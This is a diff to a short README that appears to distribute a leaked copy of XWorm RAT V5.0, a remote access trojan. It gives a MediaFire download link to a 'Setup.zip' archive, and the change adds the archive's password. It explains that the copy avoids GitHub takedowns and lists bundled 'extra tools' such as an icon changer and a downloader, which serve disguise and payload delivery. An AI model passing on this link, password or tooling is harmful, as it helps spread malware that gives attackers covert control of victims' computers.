@@ -1,7 +1,7 @@
 # XWorm-RAT V5.0
 This is the version 5.0 of a private and well-known RAT called XWorm.
 Download is here: https://www.mediafire.com/file/nhyoq3gl7iu1wsl/Setup.zip/file
-Why did i not upload to github? Because XWorm Developer is taking these down.
+Why did i not upload to github? Because XWorm Developer is taking these down. Password is: 1234
 # Extra Tools:
 🔹Icon Changer 
 🔹Downloader
